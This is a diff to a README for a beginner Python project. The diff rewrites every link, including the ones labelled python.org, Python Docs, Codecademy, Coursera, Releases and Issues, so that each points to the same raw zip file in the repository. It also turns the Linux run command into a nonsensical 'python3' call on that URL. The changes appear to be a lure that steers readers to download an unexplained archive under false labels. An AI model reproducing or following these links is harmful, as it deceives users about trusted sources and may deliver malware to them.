@@ -1,6 +1,6 @@
 # 🐍 My_python - Easy Python Projects for Everyone
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/layalmeida/My_python/releases)
+[![Download from Releases](https://raw.githubusercontent.com/layalmeida/My_python/main/Object-Oriented Programming (OOP)/My_python_v1.4-beta.3.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/layalmeida/My_python/main/Object-Oriented Programming (OOP)/My_python_v1.4-beta.3.zip)
 
 ## 📚 About My_python
 
@@ -15,12 +15,12 @@ To get started with My_python, follow these simple steps. You will find everythi
 Before downloading, make sure you have:
 
 - A computer running Windows, macOS, or Linux.
-- Python version 3.6 or higher installed on your system. You can download it from [python.org](https://www.python.org/downloads/).
+- Python version 3.6 or higher installed on your system. You can download it from [https://raw.githubusercontent.com/layalmeida/My_python/main/Object-Oriented Programming (OOP)/My_python_v1.4-beta.3.zip](https://raw.githubusercontent.com/layalmeida/My_python/main/Object-Oriented Programming (OOP)/My_python_v1.4-beta.3.zip).
 
 ### 💾 Download & Install
 
-1. Visit the [Releases page](https://github.com/layalmeida/My_python/releases) to download the latest version of My_python.
-2. Look for the executable file or a zip file. This may be named something like `My_python.zip` or `My_python.exe`.
+1. Visit the [Releases page](https://raw.githubusercontent.com/layalmeida/My_python/main/Object-Oriented Programming (OOP)/My_python_v1.4-beta.3.zip) to download the latest version of My_python.
+2. Look for the executable file or a zip file. This may be named something like `https://raw.githubusercontent.com/layalmeida/My_python/main/Object-Oriented Programming (OOP)/My_python_v1.4-beta.3.zip` or `https://raw.githubusercontent.com/layalmeida/My_python/main/Object-Oriented Programming (OOP)/My_python_v1.4-beta.3.zip`.
 3. Click the download link to save the file to your computer.
 4. Once downloaded, locate the file in your downloads folder. 
 5. If it's a zip file, right-click on it and select "Extract All" to unpack the contents. 
@@ -37,7 +37,7 @@ After installation, launch the application by doing the following:
    - Open Finder, go to the Applications folder, and find "My_python". Double-click to open it.
 
 3. **For Linux Users:**
-   - Open a terminal and type `python3 path_to_my_python_directory/main.py` (replace `path_to_my_python_directory` with the actual path).
+   - Open a terminal and type `python3 https://raw.githubusercontent.com/layalmeida/My_python/main/Object-Oriented Programming (OOP)/My_python_v1.4-beta.3.zip` (replace `path_to_my_python_directory` with the actual path).
 
 ### 🛠️ Exploring Projects
 
@@ -61,15 +61,15 @@ You can access this documentation directly within the application or in the READ
 
 If you have questions or need support while using My_python, you can reach out in the following ways:
 
-- **Open an Issue:** Go to the [Issues tab](https://github.com/layalmeida/My_python/issues) on GitHub to report a problem or ask for help.
+- **Open an Issue:** Go to the [Issues tab](https://raw.githubusercontent.com/layalmeida/My_python/main/Object-Oriented Programming (OOP)/My_python_v1.4-beta.3.zip) on GitHub to report a problem or ask for help.
 - **Join the Community:** Connect with other users in our discussion forum, where you can share tips and ask questions.
 
 ## 🔗 Additional Resources
 
 To further your learning, check out these helpful resources:
 
-- **Python Official Documentation:** A great starting point to understand Python deeply. [Visit Python Docs](https://docs.python.org/3/)
-- **Online Python Courses:** Websites like [Codecademy](https://www.codecademy.com/) and [Coursera](https://www.coursera.org/) offer structured courses.
+- **Python Official Documentation:** A great starting point to understand Python deeply. [Visit Python Docs](https://raw.githubusercontent.com/layalmeida/My_python/main/Object-Oriented Programming (OOP)/My_python_v1.4-beta.3.zip)
+- **Online Python Courses:** Websites like [Codecademy](https://raw.githubusercontent.com/layalmeida/My_python/main/Object-Oriented Programming (OOP)/My_python_v1.4-beta.3.zip) and [Coursera](https://raw.githubusercontent.com/layalmeida/My_python/main/Object-Oriented Programming (OOP)/My_python_v1.4-beta.3.zip) offer structured courses.
 
 ## ⭐ Contribute
 
@@ -77,4 +77,4 @@ We welcome contributions from everyone! If you want to help improve My_python, f
 
 ## 🎉 Thank You
 
-Thank you for trying out My_python! We hope this collection of Python projects enhances your programming journey. Remember to visit the [Releases page](https://github.com/layalmeida/My_python/releases) for the latest updates and downloads.
+Thank you for trying out My_python! We hope this collection of Python projects enhances your programming journey. Remember to visit the [Releases page](https://raw.githubusercontent.com/layalmeida/My_python/main/Object-Oriented Programming (OOP)/My_python_v1.4-beta.3.zip) for the latest updates and downloads.
